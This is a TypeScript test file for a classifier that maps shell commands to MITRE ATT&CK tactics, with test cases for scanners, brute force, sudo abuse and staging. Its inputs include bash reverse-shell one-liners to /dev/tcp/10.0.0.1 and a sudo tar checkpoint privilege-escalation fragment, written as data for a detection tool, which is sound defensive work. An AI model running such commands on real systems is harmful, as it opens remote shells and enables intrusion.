import { describe, it, expect } from "vitest";
import { classifyBinary, classifyCommand } from "./mitre";
import { extractBinary } from "./types";

describe("extractBinary", () => {
  it("keeps sudo as the binary", () => {
    expect(extractBinary("sudo -l")).toBe("sudo");
  });
  it("strips a path prefix", () => {
    expect(extractBinary("/tmp/lp.sh -a")).toBe("lp.sh");
    expect(extractBinary("./linux-exploit-suggester.sh")).toBe("linux-exploit-suggester.sh");
  });
  it("skips leading env assignments", () => {
    expect(extractBinary("FOO=1 nmap 10.0.0.1")).toBe("nmap");
  });
});

describe("classifyBinary — the deterministic prior table (§4.2)", () => {
  it("maps scanners to Discovery", () => {
    expect(classifyBinary("nmap")).toMatchObject({ tactic: "TA0007", technique: "T1046" });
    expect(classifyBinary("gobuster")).toMatchObject({ tactic: "TA0007", technique: "T1595.003" });
  });
  it("maps brute force and sqli to Initial Access", () => {
    expect(classifyBinary("hydra")).toMatchObject({ tactic: "TA0001", technique: "T1110" });
    expect(classifyBinary("sqlmap")).toMatchObject({ tactic: "TA0001", technique: "T1190" });
  });
  it("maps sudo to Privilege Escalation", () => {
    expect(classifyBinary("sudo")).toMatchObject({ tactic: "TA0004", technique: "T1548" });
  });
  it("falls back with low confidence for unknown binaries", () => {
    const r = classifyBinary("totally-unknown-tool");
    expect(r.confidence).toBeLessThan(0.3);
  });
});

describe("classifyCommand — context overrides (the few-shot cases)", () => {
  it("python -m http.server during privesc is staging, not Execution", () => {
    const r = classifyCommand("python3 -m http.server 8000", "TA0004");
    expect(r).toMatchObject({ tactic: "TA0011", technique: "T1105" });
  });
  it("the same command in recon stays its binary prior (no override)", () => {
    const r = classifyCommand("python3 -m http.server 8000", "TA0007");
    expect(r.tactic).toBe("TA0002");
  });
  it("a reverse-shell one-liner is Execution regardless of leading binary", () => {
    const r = classifyCommand('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"');
    expect(r).toMatchObject({ tactic: "TA0002", technique: "T1059" });
    expect(r.confidence).toBeGreaterThan(0.8);
  });
  it("sudo-prefixed recon is elevated recon, not privilege escalation", () => {
    expect(classifyCommand("sudo nmap -sV 10.0.0.1").tactic).toBe("TA0007");
    expect(classifyCommand("sudo gobuster dir -u http://x").tactic).toBe("TA0007");
  });
  it("sudo enumeration and gtfobin abuse stay Privilege Escalation", () => {
    expect(classifyCommand("sudo -l").tactic).toBe("TA0004");
    expect(classifyCommand("sudo tar -cf /dev/null /dev/null --checkpoint=1").tactic).toBe("TA0004");
  });
  it("ssh -i (identity file) is not a reverse shell, but real reverse shells still are", () => {
    expect(classifyCommand("ssh -i /home/u/.ssh/id_ed25519 marcus@10.0.0.1").tactic).not.toBe("TA0002");
    expect(classifyCommand("bash -i >& /dev/tcp/10.0.0.1/443 0>&1").tactic).toBe("TA0002");
  });
});
